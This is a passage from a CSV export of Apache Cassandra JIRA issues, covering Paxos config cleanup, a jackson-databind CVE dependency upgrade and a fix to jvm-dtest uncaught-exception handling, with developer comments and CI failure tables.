Merged to trunk. ;;;","04/May/22 22:41;dcapwell;moved the script to CASSANDRA-17600;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix a few config parameters after the Paxos improvements commit,CASSANDRA-17557,13440066,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,17/Apr/22 19:07,27/May/22 19:25,13/Jul/23 08:40,11/May/22 01:21,4.1,4.1-alpha1,5.0,,,,Local/Config,,,,0,,"After committing the Paxos improvements, it was identified that the following configuration parameters need additional work:
 * repair_request_timeout_in_ms - can be removed
 * paxos_auto_repair_threshold_mb - I think it can be also removed; to be confirmed with the author

Discussed a bit in Slack and on this PR - https://github.com/apache/cassandra/commit/d2923275e360a1ee9db498e748c269f701bb3a8b",,bdeggleston,benedict,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17164,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed May 11 16:12:10 UTC 2022,,,,,,,All,,,,"0|z11jgw:",9223372036854775807,,,,benedict,,,,Normal,,,,https://github.com/apache/cassandra/commit/f57c8d2c25f3a7c2b845ad9205ad25a9b04cca34,,,,,,,,,"No new tests added. Tested current test suite on trunk, results In the comments",,,,,"17/Apr/22 20:53;e.dimitrova;[Trunk pach|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:17557-trunk?expand=1] | [J8 CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1548/workflows/72d0120b-cccc-44bd-b013-f7bc5eaf589c] | [j11 CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1548/workflows/92fcf8f7-b9e3-41bf-b607-69f454709add]

There was some issue with J11 on J8 unit tests, one container has failed but I cannot see what test failed and no results were stored, as it does normally.

I reran the suite, and everything finished successfully [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1548/workflows/72d0120b-cccc-44bd-b013-f7bc5eaf589c/jobs/10100/steps].

The compression unit tests also have two failing containers without being able to identify which tests failed. Restarted [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1548/workflows/72d0120b-cccc-44bd-b013-f7bc5eaf589c/jobs/10101] 

The rest of the failures are known ones:

test_oversized_mutation - CASSANDRA-17456

utests_system_keyspace_directory - CASSANDRA-17489

I didn't run upgrade tests as those parameters were added as a patch committed only to trunk. 

[~benedict] , as agreed in Slack the other day, please, review :) ;;;","21/Apr/22 09:01;benedict;Thanks Ekaterina. I think there are two mistakes here in the original patch: the inclusion of an unnecessary property, and the failure to utilise a necessary property. The repair rpc timeout was intended to be kept, and utilised for both standard repair verbs and paxos repair verbs since if either fails due to transient slowdown it creates a lot of additional pressure on the system.

I have pushed my suggested variation on this patch [here|https://github.com/belliottsmith/cassandra/commits/17557-trunk];;;","22/Apr/22 15:44;e.dimitrova;Thanks, I rebased your branch and pushed a new CI run: [J8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1566/workflows/393c8917-1d44-41be-afec-8ab6a97b7ede],  [J11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1566/workflows/23ff50bf-a946-4097-b6d6-d624983c932c] - pending results, just started it. 

From config perspective looks good, I guess for the Verb class change someone more familiar with your latest work than me should say. [~barnie] or [~ifesdjeen] maybe? ;;;","24/Apr/22 17:20;e.dimitrova;Did a quick skim, seems to me all are known failures. I will double check with their respective tickets on Monday;;;","28/Apr/22 16:33;bdeggleston;Gave this a look at Benedict's request. Everything looks fine except for the change to read repair timeouts. Since those are part of a client query, and aren't part of any repair process as intended by this patch, I think they should be reverted to writeTimeout.;;;","28/Apr/22 16:36;benedict;🤦‍♂️;;;","29/Apr/22 15:23;e.dimitrova;[~benedict] if you two are aligned on the change around the second parameter, do you think you can take over to finish this, please? ;;;","29/Apr/22 15:46;benedict;Hi Ekaterina,

I have a long weekend here, I'm afraid. I can get to this on Tuesday.;;;","29/Apr/22 16:51;e.dimitrova;I wish I knew that yesterday when we discussed you will check it with Blake and commit.

I am swamped today and it will need final check before commit. 

CC [~mck] as he is planning to cut a branch around the 1st, for awareness.

I hope it is not an issue that we will remove a not released parameter later. Otherwise, it will have to be deprecate it and keep it. ;;;","29/Apr/22 16:53;benedict;Or the release can be delayed by a day.;;;","29/Apr/22 16:56;e.dimitrova;I don't think it is fair to delay it. 

What I can suggest is I commit now the removal of the unused parameter and then you can fix the bug around the other one as not an API change. ;;;","29/Apr/22 17:02;benedict;There is no requirement to cut a release on the 1st, only the freeze (and, I think, branch creation) has been agreed to take effect then? I would think we would want to merge all known outstanding bug fixes beforehand anyway.

But I don't really have a strong feeling either way. If it helps at all, I have pushed the necessary change Blake pointed out, so this patch is ready to commit modulo CI.;;;","29/Apr/22 17:14;brandon.williams;The branch will be cut on the 1st, but that just makes it bugfix-only, and this ticket is a bug, so while I would strive to have these things squared away sooner, I think it's okay to wait in this instance too. ;;;","29/Apr/22 17:15;e.dimitrova;Well, freeze means to me no more API changes, that is what I was told. Otherwise, definitely no release before voting, etc. I am even personally not sure whether it will be alpha or beta, I guess we will get to know next week when discussions start :) 

I will try to run CI later and if it looks good (no new failures) commit if that is fine with you and [~bdeggleston] . Thanks for pushing the patch;;;","29/Apr/22 17:17;e.dimitrova;Ops, seems our comments crashed [~brandon.williams] :) ;;;","09/May/22 17:19;e.dimitrova;Applied the patch to 4.1 and trunk and just submitted CI. Commit pending CI:

 [4.1|https://github.com/ekaterinadimitrova2/cassandra/commit/826c161e90d8bc90acb4d1b4bb334e112abcf5f5] | [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17557-4.1&filter=all]

[trunk|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:17557-trunk] | [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17557-trunk&filter=all];;;","10/May/22 14:12;e.dimitrova;*4.1 failures without trace in Jira or any CI:*

_org.apache.cassandra.distributed.test.TopPartitionsTest:_

clean 4.1 - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1599/workflows/8bf42a23-dea8-4619-9eec-07d0910e7c67

patched 4.1 - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1600/workflows/e2d4d218-c984-419c-a57c-0395517338ba

basicRangeTombstonesTest[Incremental] - It didn't manage to reproduce, I guess it is super rare and unrelated? 

configChangeTest[Incremental] - seems extremely rare, I managed to reproduce once in a blue moon  -[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1599/workflows/8bf42a23-dea8-4619-9eec-07d0910e7c67/jobs/10902/tests]

 

_org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest:_

clean 4.1 - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1604/workflows/243a20a5-eda2-4c28-95e8-ab6c4f85a891

patched 4.1 - [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1603/workflows/5f9e828b-5011-4253-8a0c-e1b32dfa1612]

Seems like flaky test on the current 4.1 that requires a ticket.

 

*trunk  failures without trace in Jira or any CI:*

_org.apache.cassandra.distributed.test.repair.ForceRepairTest:_

clean trunk - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1598/workflows/95f834ba-fd64-41b9-8eb8-f5410cd012f9

patched trunk - [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1597/workflows/9da50b66-12a5-42b0-8449-6680e15b66e7]

Managed to reproduce _forceWithDifference_ in the same class with the same error, there is a ticket opened for that one. Not 100% sure wether we can just link them. 

 

[~benedict] , please, let me know if you have any concerns around those failures or we can commit it. Thanks;;;","10/May/22 14:17;e.dimitrova;I just opened a ticket for _org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest_ before I forget - CASSANDRA-17618;;;","10/May/22 21:16;benedict;All sounds fine to me Ekaterina, thanks.;;;","11/May/22 01:03;e.dimitrova;There were new commits so I had to rerun CI but luckily there were only two flaky known tests failing on trunk, 4.1 all green.

[trunk CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17557-trunk&filter=all] 
[4.1 CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17557-4.1&filter=all]

Starting commit;;;","11/May/22 01:19;e.dimitrova;Committed:

To https://github.com/apache/cassandra.git

   89fbb1acf4..f57c8d2c25  cassandra-4.1 -> cassandra-4.1

   9e49a2b21d..e0247d6833  trunk -> trunk;;;","11/May/22 16:12;jmckenzie;I need to update this script to check across all branches for a failure; all but test_dead_sync_participant are failing on trunk as well so should have a > 1 count on failures.

test_dead_sync_participant looks like it might be flaky on 4.1 based on the butler data; strongly doubt it's related to this ticket; looks good on ASF infra relative to this work here.

[CI Results]
Branch: 4.1, build number: 14
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/14/]
JIRA: CASSANDRA-17557
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=f57c8d2c25f3a7c2b845ad9205ad25a9b04cca34]
affected paths:
 * src/java/org/apache/cassandra/service/StorageService.java
 * src/java/org/apache/cassandra/config/DatabaseDescriptor.java
 * CHANGES.txt
 * src/java/org/apache/cassandra/net/Verb.java
 * src/java/org/apache/cassandra/config/Config.java
 * src/java/org/apache/cassandra/service/StorageServiceMBean.java

Build Result: UNSTABLE
Passing Tests: 46901
Failing Tests: 8
||Test|Failures|JIRA|
|org.apache.cassandra.cql3.KeywordTest.test[keyword ROLES isReserved false]|2 of 12|CASSANDRA-17615?|
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSwitchingCDCWriteModes|4 of 12|CASSANDRA-17542?|
|org.apache.cassandra.cql3.KeywordTest.test[keyword CLUSTER isReserved false]|1 of 12|CASSANDRA-17615?|
|org.apache.cassandra.transport.CQLConnectionTest.handleCorruptionOfLargeMessageFrame-cdc|3 of 12|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.db.virtual.GossipInfoTableTest.testSelectAllWithStateTransitions-cdc|1 of 12|CASSANDRA-17584?|
|dtest-offheap.auth_test.TestAuth.test_system_auth_ks_is_alterable|2 of 12|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestAuth*%22]|
|dtest.repair_tests.repair_test.TestRepair.test_dead_sync_participant|1 of 12|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestRepair*%22]|
|org.apache.cassandra.net.proxy.ProxyHandlerTest.testNormalDelivery-cdc|1 of 12|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jackson-databind 2.13.2 is vulnerable to CVE-2020-36518,CASSANDRA-17556,13439525,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,13/Apr/22 19:22,27/May/22 19:25,13/Jul/23 08:40,28/Apr/22 14:13,3.11.13,4.0.4,4.1,4.1-alpha1,,,Build,,,,1,,Seems like it's technically possible to cause a DoS with nested json.,,bereng,cowtowncoder,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security -> Denial of Service,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Apr 28 21:28:15 UTC 2022,,,,,,,All,,,,"0|z11g54:",9223372036854775807,,,,bereng,,,,Normal,,4.0.3,,https://github.com/apache/cassandra/commit/4bb1a07b5be16b35d33ef5a4645a1209dffa9759,,,,,,,,,run CI,,,,,"13/Apr/22 19:38;brandon.williams;||Branch||CI||
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17556-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/435/workflows/bc986198-1eea-4ba4-9341-686e3ff68ccc]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17556-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/434/workflows/77804032-ff82-4a01-9c6a-bfbbc4166f0b], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/434/workflows/eb11b25f-5802-47c8-a655-03cfda6feb36]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17556-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/433/workflows/1908788a-7b92-4791-b9ea-946c2fe105cb], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/433/workflows/7e083a05-395d-4294-986f-a7c7985ffb3f]|
;;;","13/Apr/22 21:47;e.dimitrova;Considering CASSANDRA-16851   maybe it will be a good idea to double-check if we have something to consider with [~tatu-at-datastax] / [~cowtowncoder] (not sure which user he uses now so pinged both :D );;;","14/Apr/22 10:43;brandon.williams;Alas, I don't think that ticket has bearing any longer since we forgot about it and upgraded to 2.13 in CASSANDRA-17492 without issue, also for security reasons.;;;","18/Apr/22 18:05;cowtowncoder;Yeah this would be covered by either tiny bump to 2.12.6.1 of jackson-databind, or, with 2.13.2.1 (or 2.13.2.2) of jackson-databind. I don't think Cassandra would actually be exposed by this CVE (unless I misremember limited usage there is for Jackson databind), but I know that sec scan tools have no concept of actual applicability to tell it ""no, it is actually not a problem"" so it tends to be easier to Just Upgrade That Dep to silence bogus warnings.

I do check both of handles but it doesn't hurt using both so that's fine too :)

 ;;;","18/Apr/22 19:39;e.dimitrova;Thanks [~cowtowncoder],  the CVE will be covered by those versions, the question was whether again we might run into changes in those areas we use Jackson that can affect our performance while fixing security bugs. (Referring back to issues like the one we hit in  CASSANDRA-16851)

Any changes we might want to know/consider?;;;","18/Apr/22 20:25;cowtowncoder;Performance changes (or at least negatives ones) are rather rare so that issue was an outlier.
Although I can see how this specific type of change could seem suspicious to be sure.

But I do not think fix here should have any measurable performance impact; and since for 2.12.6.1 it is literally the only change beyond 2.12.6, that should be particularly safe.

I wouldn't expect 2.12 -> 2.13 have meaningful performance difference either, but there are more changes that being a minor version bump.

Put another way: I am not aware of any performance degradation between 2.12(.6) and 2.13(.2), nor expect there to be anything. But it is not possible to prove something does not exist, in general.

 

 ;;;","26/Apr/22 05:53;bereng;If I am reading this correctly we have to choose between a certain security vulnerability to C* json support ([here|https://cassandra.apache.org/doc/latest/cassandra/cql/json.html] and [here|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/cql3/Json.java]) vs an improbable performance impact. Even if the perf impact was a certain thing we'd still have to upgrade and fix it afterwards. Did I miss anything?;;;","26/Apr/22 11:01;brandon.williams;I don't think so.  We cannot release with OWASP failing, so there are only two paths here: upgrade, or determine that this isn't a problem and add a suppression.  The latter is a lot simpler for when the component is something we clearly don't use, like Netty's HTTP implementations, where here I think there would always be a shadow of doubt.  So in my view, upgrading is the likely future.;;;","26/Apr/22 12:36;bereng;I'm +1 on the upgrade as well. But happy to hear more opinions if there are any.;;;","26/Apr/22 13:27;e.dimitrova;My only question really was - is there anything we need to know around the usages or test and to remind of the old issue on the hot path. That’s it;;;","26/Apr/22 13:54;bereng;The usages I've found are auxiliary for logging with the CQL JSON support being the only one worth mentioning. I'm trying to think of more things we could do or check but nothing is coming up so far.;;;","28/Apr/22 14:13;brandon.williams;Committed, thank you.;;;","28/Apr/22 21:28;cowtowncoder;I am late to the party but I really don't think there is a big change for significant performance degradation; beyond likelihood that any upgrade could have it.
But I understand that since there was one last time – highly unusual case fwtw – there is desire to be doubly sure there is due diligence before upgrade.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jvm-dtest unhandled exceptions failing the test no longer work,CASSANDRA-17549,13439321,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,13/Apr/22 02:52,17/Jun/22 07:39,13/Jul/23 08:40,13/May/22 17:31,4.1,4.1-alpha1,,,,,Test/dtest/java,,,,0,,"Seems that ([CASSANDRA-16925] CEP-10 Phase 1: Mockable Task Execution) refactored and avoided using AbstractCluster.uncaughtException, this means that the logic to detect unexpected exceptions to fail tests no longer works.",,benedict,dcapwell,jmckenzie,,,,,,,,,,,,"smiklosovic closed pull request #1612: CASSANDRA-17549: jvm-dtest unhandled exceptions failing the test no longer work
URL: https://github.com/apache/cassandra/pull/1612


;17/Jun/22 07:39;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17620,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Transient Incorrect Response,,,,,,,,Normal,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon May 16 16:45:29 UTC 2022,,,,,,,All,,,,"0|z11ew0:",9223372036854775807,,,,benedict,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/f451c2b02827fd1db34a14e7603a52ffe4fb188e,,,,,,,,,updated tests,,,,,"13/Apr/22 02:53;dcapwell;marking 4.1 as this feature detects subtle bugs, so with this broken we could have subtle things failing, so we may actually have failing tests but think passing.;;;","13/Apr/22 06:29;benedict;> avoided using AbstractCluster.uncaughtException

It simply doesn't use {{Thread.getDefaultUncaughtExceptionHandler}}, which appears to be how in-jvm dtests currently specify the uncaught exception handler that they monitor. ;;;","14/Apr/22 17:17;benedict;This was more annoying than I would have liked, and the upgrade test I have introduced doesn't fully test the behaviour on 4.0 and back. We can strengthen that by implementing the {{executorFor}} method on earlier versions of Cassandra if we like.;;;","09/May/22 22:06;dcapwell;I don't see a link;;;","09/May/22 22:08;benedict;[trunk|https://github.com/belliottsmith/cassandra/tree/17549-trunk];;;","09/May/22 23:52;dcapwell;Spoke with [~benedict] and agreed to take this from him; fixing causes some tests to fail.;;;","09/May/22 23:53;dcapwell;I am trying to finish off CASSANDRA-17594, so if anyone wants to take this while I am doing that feel free.;;;","10/May/22 00:23;dcapwell;moved to in progress as need CI to show which tests are failing. ;;;","10/May/22 08:20;benedict;we could fix this and simply file follow-up Jira for the failures it highlights, assuming they aren't _caused_ by this patch;;;","10/May/22 15:40;dcapwell;[~benedict], patch is ready and finally passing all tests!

bq. file follow-up Jira for the failures it highlights

There are 2 changes in this PR:

1) fix the uncaught logic that the jvm-dtest had (file src/java/org/apache/cassandra/concurrent/ExecutionFailure.java)
2) map/flatMap exceptions no longer trigger uncaught handling (file src/java/org/apache/cassandra/utils/concurrent/AbstractFuture.java)

For #1, it is what directly is impacted by this JIRA, so should be present in this patch.  

For #2 it is a issue detected after fixing #1, before the refactor to Cassandra Futures, all map/flatMap (guava transform and jdk thenApply) operations would not call org.apache.cassandra.utils.JVMStabilityInspector#uncaughtException or org.apache.cassandra.utils.JVMStabilityInspector#inspectThrowable(java.lang.Throwable), but would expect the ""owner"" of the Future to handle the exceptions.  I am personally in favor of having inspectThrowable called for each future as it monitors exceptions to make sure we handle things in an expected way, but I do not feel that uncaughtException is appropriate due to its adding of logging.  Incremental Repair is a case directly impacted as we hid the following internal exception before but now it leaks out (see org.apache.cassandra.distributed.test.RepairErrorsTest#testRemoteSyncFailure)

{code}
ERROR 15:32:21 Exception in thread Thread[node1_Repair#1:1,5,Repair#1]
org.apache.cassandra.repair.SomeRepairFailedException: null
{code}

Given that both #1 and #2 were changed in the same patch, I feel it is fitting that both are changed in this patch rather than 2 related patches.;;;","10/May/22 16:09;dcapwell;Speaking in Slack [~benedict] pointed out that Futures should log before due to us extracting the error from the FutureTask, but this only happens if the FutureTask was success after execution...

We also switched IR to throw SomeRepairFailedException rather than have flatMap return a failed future, so that change is what actually triggered the new logging... switching back to flatMap with failed future avoids the logging... will create a new JIRA for this issue;;;","10/May/22 17:09;benedict;wfm +1;;;","11/May/22 03:19;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17549-cassandra-4.1-81722FC5-9AB6-4420-B1EA-646C8A33BCE2]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17549-cassandra-4.1-81722FC5-9AB6-4420-B1EA-646C8A33BCE2]|[build|unknown]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17549-trunk-81722FC5-9AB6-4420-B1EA-646C8A33BCE2]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17549-trunk-81722FC5-9AB6-4420-B1EA-646C8A33BCE2]|[build|unknown]|
;;;","12/May/22 18:52;dcapwell;few tests failed, going to update and try again.;;;","12/May/22 22:40;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17549-cassandra-4.1-CAB4FE23-1E00-4674-BD35-8E15B84CAFB4]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17549-cassandra-4.1-CAB4FE23-1E00-4674-BD35-8E15B84CAFB4]|[build|unknown]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17549-trunk-CAB4FE23-1E00-4674-BD35-8E15B84CAFB4]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17549-trunk-CAB4FE23-1E00-4674-BD35-8E15B84CAFB4]|[build|unknown]|
;;;","13/May/22 00:34;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17549-cassandra-4.1-6D2B7DB9-6A18-49E4-928D-A269DD2942FD]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17549-cassandra-4.1-6D2B7DB9-6A18-49E4-928D-A269DD2942FD]|[build|unknown]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17549-trunk-6D2B7DB9-6A18-49E4-928D-A269DD2942FD]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17549-trunk-6D2B7DB9-6A18-49E4-928D-A269DD2942FD]|[build|unknown]|
;;;","16/May/22 16:45;jmckenzie;Have a broad set of regressions taking place on 4.1; this likely helped uncover some of them. No fingers to point at your change as _causing_ any of them however.

[CI Results]
Branch: 4.1, build number: 16
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/16/]
JIRA: CASSANDRA-17549
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=f451c2b02827fd1db34a14e7603a52ffe4fb188e]
affected paths:
 * test/distributed/org/apache/cassandra/distributed/impl/Instance.java
 * test/distributed/org/apache/cassandra/distributed/test/JVMStabilityInspectorCorruptSSTableExceptionTest.java
 * src/java/org/apache/cassandra/concurrent/ExecutionFailure.java
 * test/distributed/org/apache/cassandra/distributed/test/GossipTest.java
 * test/distributed/org/apache/cassandra/distributed/test/FailingTruncationTest.java
 * test/distributed/org/apache/cassandra/distributed/test/metrics/HintsServiceMetricsTest.java
 * src/java/org/apache/cassandra/repair/RepairJob.java

Build Result: UNSTABLE
Passing Tests: 47562
Failing Tests: 21
||Test|Failures|JIRA|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable|2 of 14|CASSANDRA-17455?|
|org.apache.cassandra.cql3.KeywordTest.test[keyword GRANT isReserved true]|1 of 14|CASSANDRA-17615?|
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability|3 of 14|CASSANDRA-17307?|
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|2 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.IPMembershipTest.startupNewIP|1 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.operations.CompactStorageTest.testIndicesOnCompactTable|4 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable-compression|3 of 14|CASSANDRA-17455?|
|org.apache.cassandra.distributed.upgrade.MixedModeFrom3UnloggedBatchTest.testSimpleStrategy|1 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.PaxosRepairTest.paxosRepairVersionGate|1 of 14|CASSANDRA-17573?|
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV3XTest.testAvailability|1 of 14|CASSANDRA-17310?|
|org.apache.cassandra.distributed.upgrade.MixedModeFrom3ReplicationTest.testSimpleStrategy|1 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSwitchingCDCWriteModes|5 of 14|CASSANDRA-17542?|
|org.apache.cassandra.cql3.KeywordTest.test[keyword VARCHAR isReserved false]|1 of 14|CASSANDRA-17615?|
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSegmentFlaggingWithNonblockingOnCreation|1 of 14|CASSANDRA-17542?|
|org.apache.cassandra.cql3.validation.operations.SelectTest.testContainsOnPartitionKey|1 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.operations.CompactStorageTest.testInsertWithCompactFormat|1 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-cdc|2 of 14|CASSANDRA-17301?|
|org.apache.cassandra.distributed.test.SchemaTest.readRepairWithCompaction|1 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRangeDeletionTie-cdc|1 of 14|CASSANDRA-17458?|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testWithEmptyRestrictionValueAndSecondaryIndex|1 of 14|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation from Partition Denylist Lost in Document Migration + Minor Fixes,CASSANDRA-17547,13439263,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
